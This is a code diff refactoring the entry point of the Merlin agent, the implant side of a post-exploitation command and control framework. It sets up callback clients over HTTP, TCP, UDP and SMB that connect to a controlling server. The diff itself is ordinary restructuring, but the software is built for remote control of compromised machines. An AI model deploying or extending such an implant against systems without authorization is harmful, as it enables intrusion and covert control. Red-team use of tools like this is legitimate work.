@@ -1,6 +1,6 @@
 // Merlin is a post-exploitation command and control framework.
 // This file is part of Merlin.
-// Copyright (C) 2022  Russel Van Tuyl
+// Copyright (C) 2023  Russel Van Tuyl
 
 // Merlin is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -22,7 +22,6 @@ import (
 	"bufio"
 	"flag"
 	"fmt"
-	"github.com/Ne0nd0g/merlin-agent/clients/smb"
 	"io"
 	"os"
 	"strings"
@@ -35,10 +34,13 @@ import (
 
 	// Internal
 	"github.com/Ne0nd0g/merlin-agent/agent"
+	"github.com/Ne0nd0g/merlin-agent/clients"
 	"github.com/Ne0nd0g/merlin-agent/clients/http"
+	"github.com/Ne0nd0g/merlin-agent/clients/smb"
 	"github.com/Ne0nd0g/merlin-agent/clients/tcp"
 	"github.com/Ne0nd0g/merlin-agent/clients/udp"
 	"github.com/Ne0nd0g/merlin-agent/core"
+	"github.com/Ne0nd0g/merlin-agent/run"
 )
 
 // GLOBAL VARIABLES
@@ -49,9 +51,6 @@ var auth = "opaque"
 
 // addr the interface and port the agent will use for network connections
 var addr = "127.0.0.1:7777"
-
-// build the Agent's compiled build hash
-var build = "nonRelease"
 
 // headers a list of HTTP headers the agent will use with the HTTP protocol to communicate with the server
 var headers = ""
@@ -147,7 +146,7 @@ func main() {
 
 	if *version {
 		color.Blue(fmt.Sprintf("Merlin Agent Version: %s", core.Version))
-		color.Blue(fmt.Sprintf("Merlin Agent Build: %s", build))
+		color.Blue(fmt.Sprintf("Merlin Agent Build: %s", core.Build))
 		os.Exit(0)
 	}
 
@@ -170,10 +169,11 @@ func main() {
 	}
 
 	// Get the client
+	var client clients.Client
 	switch protocol {
 	case "http", "https", "h2", "h2c", "http3":
 		clientConfig := http.Config{
-			AgentID:      a.ID,
+			AgentID:      a.ID(),
 			Protocol:     protocol,
 			Host:         host,
 			Headers:      headers,
@@ -191,7 +191,7 @@ func main() {
 			clientConfig.URL = strings.Split(strings.ReplaceAll(url, " ", ""), ",")
 		}
 
-		a.Client, err = http.New(clientConfig)
+		client, err = http.New(clientConfig)
 		if err != nil {
 			if *verbose {
 				color.Red(err.Error())
@@ -206,7 +206,7 @@ func main() {
 			}
 		}
 		config := tcp.Config{
-			AgentID:      a.ID,
+			AgentID:      a.ID(),
 			ListenerID:   listenerID,
 			PSK:          psk,
 			Address:      []string{addr},
@@ -217,7 +217,7 @@ func main() {
 		}
 
 		// Get the client
-		a.Client, err = tcp.New(config)
+		client, err = tcp.New(config)
 		if err != nil {
 			if *verbose {
 				color.Red(err.Error())
@@ -232,7 +232,7 @@ func main() {
 			}
 		}
 		config := udp.Config{
-			AgentID:      a.ID,
+			AgentID:      a.ID(),
 			ListenerID:   listenerID,
 			PSK:          psk,
 			Address:      []string{addr},
@@ -243,7 +243,7 @@ func main() {
 		}
 
 		// Get the client
-		a.Client, err = udp.New(config)
+		client, err = udp.New(config)
 		if err != nil {
 			if *verbose {
 				color.Red(err.Error())
@@ -259,7 +259,7 @@ func main() {
 		}
 		config := smb.Config{
 			Address:      []string{addr},
-			AgentID:      a.ID,
+			AgentID:      a.ID(),
 			AuthPackage:  auth,
 			ListenerID:   listenerID,
 			Padding:      padding,
@@ -268,7 +268,7 @@ func main() {
 			Mode:         protocol,
 		}
 		// Get the client
-		a.Client, err = smb.New(config)
+		client, err = smb.New(config)
 		if err != nil {
 			if *verbose {
 				color.Red(err.Error())
@@ -283,7 +283,7 @@ func main() {
 	}
 
 	// Start the agent
-	a.Run()
+	run.Run(a, client)
 }
 
 // usage prints command line options
